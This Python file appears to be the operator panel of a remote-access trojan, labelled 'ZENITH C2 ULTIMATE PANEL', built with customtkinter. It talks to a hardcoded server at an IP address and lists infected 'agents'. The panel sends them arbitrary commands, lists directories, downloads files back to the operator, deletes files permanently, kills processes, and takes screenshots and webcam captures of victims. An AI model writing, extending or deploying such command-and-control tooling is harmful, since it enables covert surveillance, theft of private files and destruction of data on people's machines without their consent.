import customtkinter as ctk
import requests
import threading
import time
import os
from PIL import Image, ImageTk
import io

# --- Конфигурация ---
VPS_URL = "http://45.76.76.74:43445"
ADMIN_PASS = "MY_ADMIN_PASSWORD"
HEADERS = {"Admin-Auth": ADMIN_PASS}

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class ZenithAdmin(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("ZENITH C2 ULTIMATE PANEL")
        self.geometry("1400x850")
        self.selected_cid = None
        self.last_result = ""

        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- Sidebar: Список клиентов ---
        self.sidebar = ctk.CTkFrame(self, width=250, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        ctk.CTkLabel(self.sidebar, text="PROJECT ZENITH", font=("Impact", 24)).pack(pady=20)
        
        self.client_frame = ctk.CTkScrollableFrame(self.sidebar, label_text="ACTIVE AGENTS")
        self.client_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # --- Main View: Tabs ---
        self.tabs = ctk.CTkTabview(self)
        self.tabs.grid(row=0, column=1, sticky="nsew", padx=10, pady=10)
        
        self.tab_console = self.tabs.add("Terminal")
        self.tab_files = self.tabs.add("File Manager")
        self.tab_media = self.tabs.add("Media Viewer")

        # --- Tab 1: Terminal ---
        self.console = ctk.CTkTextbox(self.tab_console, font=("Consolas", 14), fg_color="#0a0a0a", text_color="#00FF00")
        self.console.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.input_frame = ctk.CTkFrame(self.tab_console)
        self.input_frame.pack(fill="x", padx=5, pady=5)
        self.cmd_entry = ctk.CTkEntry(self.input_frame, placeholder_text="Enter manual command...")
        self.cmd_entry.pack(side="left", fill="x", expand=True, padx=5)
        self.cmd_entry.bind("<Return>", lambda e: self.send_manual())
        ctk.CTkButton(self.input_frame, text="RUN", width=100, command=self.send_manual).pack(side="right")

        # --- Tab 2: File Manager ---
        self.file_nav_frame = ctk.CTkFrame(self.tab_files)
        self.file_nav_frame.pack(fill="x", padx=5, pady=5)
        
        self.path_entry = ctk.CTkEntry(self.file_nav_frame)
        self.path_entry.insert(0, "C:\\")
        self.path_entry.pack(side="left", fill="x", expand=True, padx=5)
        
        ctk.CTkButton(self.file_nav_frame, text="LIST DIR (LS)", command=self.cmd_ls).pack(side="left", padx=2)
        
        self.file_display = ctk.CTkTextbox(self.tab_files, font=("Consolas", 12))
        self.file_display.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.file_actions = ctk.CTkFrame(self.tab_files)
        self.file_actions.pack(fill="x", padx=5, pady=5)
        ctk.CTkButton(self.file_actions, text="DOWNLOAD SELECTED", fg_color="green", command=self.cmd_download).pack(side="left", padx=5)
        ctk.CTkButton(self.file_actions, text="DELETE PERMANENTLY", fg_color="red", command=self.cmd_delete).pack(side="left", padx=5)

        # --- Tab 3: Media Viewer ---
        self.media_label = ctk.CTkLabel(self.tab_media, text="No image received yet")
        self.media_label.pack(fill="both", expand=True)

        # --- Right Panel: Quick Actions ---
        self.right_panel = ctk.CTkFrame(self, width=200)
        self.right_panel.grid(row=0, column=2, sticky="nsew", padx=10, pady=10)
        
        ctk.CTkLabel(self.right_panel, text="QUICK ACTIONS", font=("Arial", 14, "bold")).pack(pady=10)
        ctk.CTkButton(self.right_panel, text="📸 SCREENSHOT", command=lambda: self.send_cmd("screenshot")).pack(pady=5, padx=10, fill="x")
        ctk.CTkButton(self.right_panel, text="📷 WEBCAM", command=lambda: self.send_cmd("webcam")).pack(pady=5, padx=10, fill="x")
        
        ctk.CTkLabel(self.right_panel, text="Process Manager").pack(pady=(20,0))
        self.pid_entry = ctk.CTkEntry(self.right_panel, placeholder_text="PID to kill")
        self.pid_entry.pack(pady=5, padx=10)
        ctk.CTkButton(self.right_panel, text="KILL PROCESS", fg_color="orange", command=self.cmd_kill).pack(pady=5, padx=10, fill="x")

        # Start Background Refresh
        threading.Thread(target=self.refresh_loop, daemon=True).start()

    def send_cmd(self, cmd):
        if not self.selected_cid:
            self.console.insert("end", "[!] ERROR: No client selected!\n")
            return
        try:
            r = requests.post(f"{VPS_URL}/admin/push", json={"cid": self.selected_cid, "cmd": cmd}, headers=HEADERS)
            if r.status_code == 200:
                self.console.insert("end", f"[SENT] -> {cmd}\n")
        except Exception as e:
            self.console.insert("end", f"[!] ERR: {e}\n")

    def send_manual(self):
        self.send_cmd(self.cmd_entry.get())
        self.cmd_entry.delete(0, 'end')

    def cmd_ls(self):
        self.send_cmd(f"ls {self.path_entry.get()}")
        self.tabs.set("File Manager")

    def cmd_download(self):
        self.send_cmd(f"download {self.path_entry.get()}")

    def cmd_delete(self):
        self.send_cmd(f"rmfile {self.path_entry.get()}")

    def cmd_kill(self):
        self.send_cmd(f"kill {self.pid_entry.get()}")

    def select_client(self, cid):
        self.selected_cid = cid
        self.console.insert("end", f"\n[*] Target changed to: {cid}\n")

    def update_media(self, srv_path):
        try:
            r = requests.get(f"{VPS_URL}/admin/get_file/{srv_path}", headers=HEADERS)
            img_data = Image.open(io.BytesIO(r.content))
            # Resize for preview
            img_data.thumbnail((1000, 700))
            photo = ctk.CTkImage(light_image=img_data, dark_image=img_data, size=(img_data.width, img_data.height))
            self.media_label.configure(image=photo, text="")
            self.tabs.set("Media Viewer")
        except Exception as e:
            print(f"Media Load Error: {e}")

    def refresh_loop(self):
        while True:
            try:
                # Получение списка клиентов
                resp = requests.get(f"{VPS_URL}/admin/list", headers=HEADERS).json()
                
                # Обновление кнопок клиентов
                for widget in self.client_frame.winfo_children():
                    widget.destroy()
                
                for cid, data in resp.items():
                    color = "green" if data["status"] == "online" else "gray"
                    btn = ctk.CTkButton(self.client_frame, text=f"{data['name']}\n{cid[:10]}...", 
                                        fg_color="transparent", border_width=1, border_color=color,
                                        command=lambda c=cid: self.select_client(c))
                    btn.pack(pady=5, fill="x", padx=5)
                    
                    # Если есть новый результат для выбранного клиента
                    if cid == self.selected_cid and data["result"] != self.last_result:
                        res = data["result"]
                        self.last_result = res
                        
                        if res.startswith("IMAGE_PATH:"):
                            self.update_media(res.split(":")[1])
                        elif res.startswith("DOWNLOADED_PATH:"):
                            path = res.split(":")[1]
                            # Скачиваем файл себе в папку админки
                            fr = requests.get(f"{VPS_URL}/admin/get_file/{path}", headers=HEADERS)
                            local_name = os.path.basename(path)
                            with open(local_name, "wb") as f:
                                f.write(fr.content)
                            self.console.insert("end", f"[!] SUCCESS: File {local_name} saved to local folder!\n")
                        elif res.startswith("Directory of"):
                            self.file_display.delete("1.0", "end")
                            self.file_display.insert("end", res)
                        else:
                            self.console.insert("end", f"[{cid}] Result:\n{res}\n")
                        self.console.see("end")
            except:
                pass
            time.sleep(5)

if __name__ == "__main__":
    app = ZenithAdmin()
    app.mainloop()